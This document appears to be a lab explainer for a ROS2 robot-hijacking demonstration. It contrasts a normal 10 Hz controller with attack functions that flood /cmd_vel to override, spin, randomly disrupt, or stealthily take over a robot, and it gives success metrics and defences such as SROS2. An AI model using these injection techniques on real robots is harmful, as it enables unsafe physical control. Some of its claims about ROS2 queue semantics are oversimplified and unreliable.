# Script Logic and Attack Success Criteria

## 1. Normal Controller Logic

### Core Mechanism

The `normal_controller.py` simulates a **legitimate operator** controlling the robot with predictable, regular patterns.

### Key Components

#### A. Publishing Mechanism
```python
self.publisher = self.create_publisher(TwistStamped, '/cmd_vel', 10)
```
- **Topic**: `/cmd_vel` (robot control topic)
- **Message Type**: `TwistStamped` (velocity command with timestamp)
- **Queue Size**: 10 (ROS2 message queue)

#### B. Frequency Control
```python
period = 1.0 / frequency  # e.g., 10 Hz = 0.1 second period
while time.time() - start_time < duration:
    msg = self._create_twist_stamped(...)
    self.publisher.publish(msg)
    time.sleep(period)  # Wait for next publish cycle
```

**Default**: 10 Hz (10 messages per second)
- Each message sent every 0.1 seconds
- Predictable, regular timing

#### C. Pattern Logic

**Square Pattern** (default):
```python
cycle_time = current_time % 8  # 8-second cycle

if cycle_time < 2.0:
    # Forward for 2 seconds
    linear_x = 0.2 m/s, angular_z = 0
elif cycle_time < 4.0:
    # Turn right for 2 seconds
    linear_x = 0, angular_z = -0.5 rad/s
elif cycle_time < 6.0:
    # Forward for 2 seconds
    linear_x = 0.2 m/s, angular_z = 0
else:
    # Turn right for 2 seconds
    linear_x = 0, angular_z = -0.5 rad/s
```

**Behavior**: Robot moves in a square pattern
- Forward → Turn → Forward → Turn → Repeat

**Circle Pattern**:
```python
# Constant forward + slight turn = circular motion
linear_x = 0.2 m/s, angular_z = 0.3 rad/s
```

**Forward-Backward Pattern**:
```python
cycle_time = current_time % 4  # 4-second cycle
if cycle_time < 2.0:
    linear_x = 0.2 m/s  # Forward
else:
    linear_x = -0.2 m/s  # Backward
```

**Continuous Pattern**:
```python
# Constant forward movement
linear_x = 0.2 m/s, angular_z = 0
```

### Normal Controller Characteristics

1. **Predictable**: Follows a fixed pattern
2. **Regular Frequency**: 10 Hz (consistent timing)
3. **Moderate Speed**: 0.2 m/s (safe, controlled)
4. **Pattern-Based**: Repeating cycles (square, circle, etc.)

---

## 2. Attack Script Logic

### Core Mechanism

The `injection_attack.py` attempts to **override** the normal controller by publishing at a **higher frequency** to dominate the `/cmd_vel` topic.

### Key Strategy: Frequency-Based Override

#### A. Higher Frequency = Better Override Chance

```python
# Normal: 10 Hz (10 messages/second)
# Attack: 50 Hz (50 messages/second) = 5x more messages!
period = 1.0 / frequency  # 50 Hz = 0.02 second period
```

**Why This Works**:
- ROS2 topics use a **queue** (size 10 by default)
- Higher frequency fills the queue faster
- More recent messages from attacker
- Robot receives attacker's commands more often

#### B. Attack Types

**1. Override Attack** (default):
```python
def attack_override(frequency=50, duration=30, attack_speed=0.5):
    while time.time() - start_time < duration:
        # Send forward command at HIGH frequency
        msg = self._create_twist_stamped(linear_x=attack_speed)  # 0.5 m/s
        self.publisher.publish(msg)
        time.sleep(1.0/50)  # 50 Hz = 20ms between messages
```

**Logic**:
- Sends **forward commands** at 50 Hz
- Speed: 0.5 m/s (faster than normal 0.2 m/s)
- **Goal**: Override normal pattern, force robot forward

**2. Spin Attack**:
```python
def attack_spin(frequency=30, angular_speed=2.0):
    while time.time() - start_time < duration:
        # Send rotation command
        msg = self._create_twist_stamped(angular_z=angular_speed)  # 2.0 rad/s
        self.publisher.publish(msg)
        time.sleep(1.0/30)  # 30 Hz
```

**Logic**:
- Sends **rotation commands** at 30 Hz
- Angular speed: 2.0 rad/s (rapid rotation)
- **Goal**: Make robot spin uncontrollably

**3. Interference Attack**:
```python
def attack_interference(frequency=40):
    while time.time() - start_time < duration:
        # Random commands to disrupt
        linear_x = random.uniform(-0.3, 0.5)
        angular_z = random.uniform(-1.0, 1.0)
        msg = self._create_twist_stamped(linear_x, angular_z)
        self.publisher.publish(msg)
        time.sleep(1.0/40)  # 40 Hz
```

**Logic**:
- Sends **random commands** at 40 Hz
- Creates chaotic, unpredictable behavior
- **Goal**: Disrupt normal control completely

**4. Stealth Attack**:
```python
def attack_stealth_override(frequency=25, attack_speed=0.3):
    while time.time() - start_time < duration:
        msg = self._create_twist_stamped(linear_x=attack_speed)
        self.publisher.publish(msg)
        # Random delay to appear natural
        time.sleep(period + random.uniform(-0.01, 0.01))
```

**Logic**:
- Moderate frequency (25 Hz) to avoid detection
- Slight random delays to appear natural
- **Goal**: Override without being obvious

### Attack Script Characteristics

1. **High Frequency**: 50 Hz vs normal 10 Hz (5x more messages)
2. **Aggressive**: Faster speeds (0.5 m/s vs 0.2 m/s)
3. **Persistent**: Continuous publishing during attack duration
4. **Competitive**: Tries to fill message queue faster than normal controller

---

## 3. ROS2 Topic Behavior

### How ROS2 Handles Multiple Publishers

When multiple nodes publish to the same topic (`/cmd_vel`):

1. **No Built-in Priority**: ROS2 doesn't prioritize publishers
2. **Queue-Based**: Messages go into a queue (size 10)
3. **Last-Write-Wins**: More recent messages have higher chance to be processed
4. **Frequency Matters**: Higher frequency = more messages = better chance to override

### Message Flow

```
Normal Controller (10 Hz)     Attack Script (50 Hz)
      |                              |
      v                              v
   [Queue: /cmd_vel]  ←  Messages compete here
      |
      v
  Robot receives commands
```

**Key Point**: The robot receives the **most recent messages** from the queue. Higher frequency means attacker's messages are more recent.

---

## 4. Attack Success Criteria

### Success Indicators

#### A. Visual Observation (Primary Method)

**✅ Attack Successful**:
1. **Behavior Change**: Robot stops following normal pattern
   - Square pattern → Robot goes straight forward
   - Circle pattern → Robot changes direction
   - Normal movement → Robot spins or moves erratically

2. **Speed Change**: Robot moves faster than normal
   - Normal: 0.2 m/s
   - Attack: 0.5 m/s (if override attack)
   - Robot visibly moves faster

3. **Direction Change**: Robot ignores normal pattern
   - Should turn → Goes straight
   - Should go forward → Spins (if spin attack)
   - Should follow pattern → Random movement (if interference)

4. **Timing**: Behavior changes **during attack period**
   - Before attack: Normal pattern
   - During attack: Attack behavior
   - After attack: Returns to normal (if normal controller still running)

#### B. Topic Monitoring (Quantitative Method)

**Monitor `/cmd_vel` topic**:
```bash
ros2 topic echo /cmd_vel
```

**Success Indicators**:
1. **Message Source**: See messages from `injection_attacker` node
2. **Message Frequency**: Higher frequency messages (50 Hz vs 10 Hz)
3. **Command Values**: 
   - Override: `linear.x = 0.5` (attack speed)
   - Spin: `angular.z = 2.0` (rotation)
   - Interference: Random values

**Check Message Rate**:
```bash
ros2 topic hz /cmd_vel
```

**Expected**:
- Before attack: ~10 Hz (normal controller)
- During attack: ~50-60 Hz (both controllers, but attack dominates)
- After attack: ~10 Hz (normal controller)

#### C. Node Information (Verification Method)

**Check Active Publishers**:
```bash
ros2 topic info /cmd_vel
```

**Expected Output**:
```
Type: geometry_msgs/msg/TwistStamped
Publisher count: 2  ← Both normal and attack nodes
Subscription count: 1  ← Robot subscribes
```

**Check Node Details**:
```bash
ros2 node info /normal_operator
ros2 node info /injection_attacker
```

Both should show they publish to `/cmd_vel`.

#### D. Position Tracking (Advanced Method)

**Monitor Robot Position**:
```bash
ros2 topic echo /odom
```

**Success Indicators**:
1. **Position Deviation**: Robot moves away from expected pattern
2. **Speed Increase**: Position changes faster (higher velocity)
3. **Unexpected Movement**: Robot moves in wrong direction

---

## 5. Success Criteria Summary

### Primary Success Criteria (Must Have)

1. ✅ **Visual Behavior Change**: Robot stops following normal pattern
2. ✅ **Timing Match**: Change occurs during attack period
3. ✅ **Attack Commands Visible**: Can see attack messages in topic

### Secondary Success Criteria (Nice to Have)

4. ✅ **Frequency Increase**: Topic frequency increases during attack
5. ✅ **Position Deviation**: Robot position deviates from expected path
6. ✅ **Speed Change**: Robot moves at attack speed (0.5 m/s)

### Failure Indicators

❌ **Attack Failed**:
- Robot continues normal pattern during attack
- No behavior change
- Attack messages not reaching robot
- Normal controller still dominates

❌ **Partial Success**:
- Erratic behavior (both controllers competing)
- Robot moves but not as expected
- Unpredictable movement

---

## 6. Example Success Scenario

### Timeline

```
T=0s:    Normal controller starts (square pattern, 10 Hz)
T=0-5s:  Robot follows square pattern normally
         - Forward 2s → Turn 2s → Forward 2s → Turn 2s
T=5s:    Attack starts (override, 50 Hz, forward 0.5 m/s)
T=5-20s: ✅ SUCCESS: Robot stops turning, goes straight forward
         - Ignores square pattern
         - Moves at 0.5 m/s (faster than normal 0.2 m/s)
         - Continues forward instead of turning
T=20s:   Attack ends
T=20-60s: Robot returns to square pattern (if normal controller still running)
```

### What to Look For

1. **Before Attack (T=0-5s)**:
   - Robot: Square pattern, predictable movement
   - Topic: ~10 Hz, messages from `normal_operator`

2. **During Attack (T=5-20s)**:
   - Robot: **Straight forward**, faster speed, ignores turns
   - Topic: ~50-60 Hz, messages from both nodes (attack dominates)
   - **This is SUCCESS!**

3. **After Attack (T=20s+)**:
   - Robot: Returns to square pattern
   - Topic: ~10 Hz, messages from `normal_operator`

---

## 7. Quantitative Success Metrics

### Success Rate Calculation

You can measure success quantitatively:

```python
# Pseudo-code for success measurement
def measure_attack_success():
    # Monitor /cmd_vel topic
    attack_messages = count_messages_from('injection_attacker')
    normal_messages = count_messages_from('normal_operator')
    
    # During attack period
    total_messages = attack_messages + normal_messages
    attack_ratio = attack_messages / total_messages
    
    # Success if attack messages > 50% of total
    if attack_ratio > 0.5:
        return "SUCCESS: Attack dominated topic"
    else:
        return "FAILED: Normal controller still dominant"
```

### Expected Values

- **Attack Success**: Attack messages > 70% of total during attack period
- **Partial Success**: Attack messages 30-70% of total
- **Attack Failed**: Attack messages < 30% of total

---

## 8. Factors Affecting Success

### Factors That Help Attack Succeed

1. ✅ **Higher Frequency**: 50 Hz vs 10 Hz (5x advantage)
2. ✅ **Longer Duration**: More time to override
3. ✅ **Faster Speed**: 0.5 m/s vs 0.2 m/s (more noticeable)
4. ✅ **Queue Size**: Smaller queue (default 10) = faster override

### Factors That Help Defense

1. ✅ **Higher Normal Frequency**: If normal uses 20 Hz, attack needs >40 Hz
2. ✅ **Larger Queue**: Larger queue = more normal messages buffered
3. ✅ **Priority System**: If implemented (not default ROS2)
4. ✅ **Access Control**: Block attacker from publishing (SROS2)

---

## 9. Conclusion

### Normal Controller Logic
- **Purpose**: Simulate legitimate operator
- **Method**: Regular patterns at 10 Hz
- **Behavior**: Predictable, safe movements

### Attack Script Logic
- **Purpose**: Override normal control
- **Method**: High-frequency publishing (50 Hz)
- **Strategy**: Fill queue faster, dominate topic

### Success Criteria
- **Primary**: Visual behavior change during attack
- **Secondary**: Topic monitoring, position tracking
- **Quantitative**: Attack message ratio > 50%

**Key Insight**: In ROS2, **frequency is power**. Higher frequency publishing gives better chance to override legitimate control, demonstrating the vulnerability of unsecured ROS2 topics.

